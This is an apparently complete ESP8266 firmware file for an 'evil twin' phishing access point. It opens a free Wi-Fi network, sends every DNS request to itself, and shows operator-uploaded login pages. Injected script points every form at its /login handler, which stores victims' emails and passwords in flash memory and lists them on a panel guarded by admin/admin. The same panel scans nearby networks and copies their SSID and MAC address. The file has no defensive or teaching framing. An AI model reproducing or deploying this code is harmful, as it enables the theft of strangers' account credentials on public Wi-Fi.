#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <vector>

const char *softap_ssid = "ESP8266AP"; // Rename to whatever

ESP8266WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // IP of esp

String customHtml = "";
std::vector<String> loginAttempts;
std::vector<String> apList;

// Basic Authentication credentials
const char* adminUser = "admin";
const char* adminPassword = "admin";

bool isAuthenticated() {
  if (!server.authenticate(adminUser, adminPassword)) {
    server.requestAuthentication();
    return false;
  }
  return true;
}

void handleAdminRoot() {
  if (!isAuthenticated()) {
    return;
  }

  String html = "<!DOCTYPE html><html><head><title>Captive Portal Panel</title><style>";
  html += "/* Global Styles */";
  html += "body {";
  html += "  font-family: 'Open Sans', sans-serif;";
  html += "  margin: 0;";
  html += "  padding: 0;";
  html += "  background-color: #12264d; /* Dark background */";
  html += "  color: #ffffff; /* White text */";
  html += "}";
  html += "/* Header Styles */";
  html += "header {";
  html += "  background-color: #12264d;";
  html += "  background-image: linear-gradient(to bottom, #12264d, #18336c);";
  html += "  padding: 20px;";
  html += "  text-align: center; /* Center align header text */";
  html += "}";
  html += "header h1 {";
  html += "  color: #ffffff;";
  html += "  font-size: 24px;";
  html += "  margin: 0;";
  html += "}";
  html += "/* Content Area Styles */";
  html += ".content {";
  html += "  background-color: #1a3a70; /* Darker background for content */";
  html += "  padding: 20px;";
  html += "  margin: 20px; /* Added margin for spacing */";
  html += "  border-radius: 10px; /* Rounded corners */";
  html += "}";
  html += ".content h1 {";
  html += "  color: #ffffff;";
  html += "  font-size: 18px;";
  html += "  margin-bottom: 10px;";
  html += "  text-align: center; /* Center align content title */";
  html += "}";
  html += "/* Form Styles */";
  html += "form {";
  html += "  display: flex;";
  html += "  flex-direction: column;";
  html += "  align-items: center;";
  html += "}";
  html += "textarea, input[type=\"text\"] {";
  html += "  border: 1px solid #18336c;";
  html += "  background-color: #f7f7f7;";
  html += "  padding: 10px;";
  html += "  font-size: 16px;";
  html += "  color: #3d5893;";
  html += "  width: 60%;";
  html += "  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);";
  html += "  margin-top: 10px;";
  html += "}";
  html += "input[type=\"submit\"] {";
  html += "  background-color: #2c77d8;";
  html += "  color: #ffffff;";
  html += "  padding: 10px 20px;";
  html += "  border: none;";
  html += "  border-radius: 5px;";
  html += "  cursor: pointer;";
  html += "  margin-top: 10px;";
  html += "}";
  html += "input[type=\"submit\"]:hover {";
  html += "  background-color: #1a3a90;";
  html += "}";
  html += "</style></head><body>";
  html += "<header><h1>Captive Portal Panel</h1></header>";
  html += "<div class=\"content\">";
  html += "<h1>Upload HTML for Captive Portal</h1>";
  html += "<form action=\"/upload\" method=\"POST\"><textarea name=\"html\" rows=\"20\" cols=\"40\"></textarea><br><input type=\"submit\" value=\"Upload\"></form>";
  html += "<h1>AP Scanner</h1>";
  html += "<form action=\"/apscanner\" method=\"POST\">";
  html += "<select name=\"interval\">";
  html += "<option value=\"5\">5s</option>";
  html += "<option value=\"10\">10s</option>";
  html += "<option value=\"15\">15s</option>";
  html += "<option value=\"30\">30s</option>";
  html += "</select>";
  html += "<input type=\"submit\" value=\"Scan\"></form>";

  // Form to change softap_ssid and MAC address
  html += "<h1>Change SoftAP Settings</h1>";
  html += "<form action=\"/changesettings\" method=\"POST\">";
  html += "<label for=\"ssid\">SoftAP SSID:</label>";
  html += "<input type=\"text\" id=\"ssid\" name=\"ssid\"><br>";
  html += "<label for=\"mac\">SoftAP MAC Address:</label>";
  html += "<input type=\"text\" id=\"mac\" name=\"mac\"><br>";
  html += "<input type=\"submit\" value=\"Submit\"></form>";

  for (const String &ap : apList) {
    html += "<li>" + ap + "</li>";
  }
  html += "</ul>";
  html += "<h1>Login Attempts</h1><ul>";
  for (const String &attempt : loginAttempts) {
    html += "<li>" + attempt + "</li>";
  }
  html += "</ul></body></html>";

  server.send(200, "text/html", html);
}

void handleChangeSettings() {
  if (!isAuthenticated()) {
    return;
  }

  if (server.hasArg("ssid") && server.hasArg("mac")) {
    String ssid = server.arg("ssid");
    String mac = server.arg("mac");

    // Convert MAC address string to bytes array
    uint8_t macBytes[6];
    if (sscanf(mac.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx", &macBytes[0], &macBytes[1], &macBytes[2], &macBytes[3], &macBytes[4], &macBytes[5]) != 6) {
      server.send(400, "text/plain", "Invalid MAC address format");
      return;
    }

    // Stop the current SoftAP
    WiFi.softAPdisconnect();
    delay(1000);

    // Stop the DNS server
    dnsServer.stop();

    // Update the softap_ssid variable
    softap_ssid = ssid.c_str();

    // Create a new SoftAP with the updated SSID and MAC address
    WiFi.softAP(ssid.c_str(), NULL, 1, false, 1);
    WiFi.softAPmacAddress(macBytes);

    dnsServer.start(DNS_PORT, "*", apIP);

    // Send the updated HTML template back to the client
    handleAdminRoot();
  } else {
    server.send(400, "text/plain", "Missing parameters");
  }
}

void handleUpload() {
  if (!isAuthenticated()) {
    return;
  }

  if (server.hasArg("html")) {
    customHtml = server.arg("html");
    server.send(200, "text/plain", "HTML template uploaded successfully!");
    server.sendHeader("Location", "/admin");
    delay(2000);
    server.send(303); // redirect back to /admin
  } else {
    server.send(400, "text/plain", "Missing HTML template");
  }
}

void handleCaptivePortal() {
  if (customHtml!= "") {
    String modifiedHtml = customHtml;

    // try to replace form in existing template
    int headEndIdx = modifiedHtml.indexOf("</head>");
    if (headEndIdx!= -1) {
      String script = "<script>"
                      "document.addEventListener('DOMContentLoaded', function() {"
                      "  var forms = document.getElementsByTagName('form');"
                      "  for (var i = 0; i < forms.length; i++) {"
                      "    forms[i].action = '/login';"
                      "    forms[i].method = 'POST';"
                      "  }"
                      "});"
                      "</script>";
      modifiedHtml = modifiedHtml.substring(0, headEndIdx) + script + modifiedHtml.substring(headEndIdx);
    }
    server.send(200, "text/html", modifiedHtml);
  } else {
    server.send(200, "text/html", "<html><body><h1>No HTML template uploaded</h1></body></html>");
  }
}

void handleAPScanner() {
  if (!isAuthenticated()) {
    return;
  }

  apList.clear();

  int scanInterval = 5000; // Default scan is 5s
  if (server.hasArg("interval")) {
    scanInterval = server.arg("interval").toInt() * 1000;
  }

  WiFi.disconnect();

  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    String apName = WiFi.SSID(i);
    String macAddress = WiFi.BSSIDstr(i);
    apList.push_back("AP Name: " + apName + ", MAC Address: " + macAddress);
  }

  // Reconnect to the previous network
  WiFi.begin(); 

  delay(scanInterval); // Delay to allow the scan to complete

  server.send(200, "text/plain", "AP scan completed!");
  server.sendHeader("Location", "/admin");
  server.send(303);
}



void handleLogin() {
  if (server.hasArg("email") && server.hasArg("password")) {
    String email = server.arg("email");
    String password = server.arg("password");
    String attempt = "Email: " + email + ", Password: " + password;
    loginAttempts.push_back(attempt);

    Serial.print("Captured credentials - Email: ");
    Serial.print(email);
    Serial.print(", Password: ");
    Serial.println(password);

    // Save credentials to SPIFFS
    File file = SPIFFS.open("/pass", "a+");
    if (!file) {
      Serial.println("Failed to open file for writing");
      server.send(500, "text/plain", "Internal Server Error");
      return;
    }
    file.println(attempt);
    file.close();

    server.send(200, "text/plain", "Credentials captured and saved!");
  } else {
    server.send(400, "text/plain", "Invalid request");
  }
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting Fake AP and Captive Portal...");

  WiFi.mode(WIFI_AP);
  WiFi.softAP(softap_ssid); // Open network without password

  // Configure DNS server to redirect all requests to the captive portal
  dnsServer.start(DNS_PORT, "*", apIP);

  Serial.print("AP IP address: ");
  Serial.println(WiFi.softAPIP());

  // Initialize SPIFFS file system
  if (!SPIFFS.begin()) {
    Serial.println("Failed to mount file system");
    return;
  }

  server.on("/admin", HTTP_GET, handleAdminRoot);
  server.on("/upload", HTTP_POST, handleUpload);
  server.on("/", HTTP_GET, handleCaptivePortal);  // captive portal at root handler
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/apscanner", HTTP_POST, handleAPScanner);
  server.on("/changesettings", HTTP_POST, handleChangeSettings);

  server.onNotFound(handleCaptivePortal);

  server.begin();
  Serial.println("Web server started. Open http://192.168.4.1 in your browser.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}